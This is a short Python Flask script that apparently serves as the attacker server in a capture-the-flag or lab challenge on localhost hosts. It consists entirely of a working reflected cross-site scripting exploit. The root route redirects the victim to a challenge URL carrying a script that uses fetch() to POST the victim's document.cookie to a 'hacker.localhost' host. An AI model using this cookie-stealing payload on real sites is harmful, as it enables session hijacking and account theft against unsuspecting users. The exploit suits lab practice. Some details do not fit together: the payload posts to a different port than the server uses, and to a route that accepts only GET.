import flask
import os
app = flask.Flask(__name__)

@app.route("/", methods = ["GET"])
def hello():
	return flask.redirect("http://challenge.localhost/ephemeral?msg=<script>fetch(\"http:%2f%2fhacker.localhost:1338%2fcookie\",{method:\"POST\",body:JSON.stringify({msg:document.cookie})})<%2fscript>", code=302)

@app.route("/cookie", methods = ["GET"])
def cookie():
	msg = flask.request.args.get("msg", "test msg")
	return msg

app.secret_key = os.urandom(8)
port = 1337
app.config['SERVER_NAME'] = f"hacker.localhost:{port}"
app.run("hacker.localhost", port)
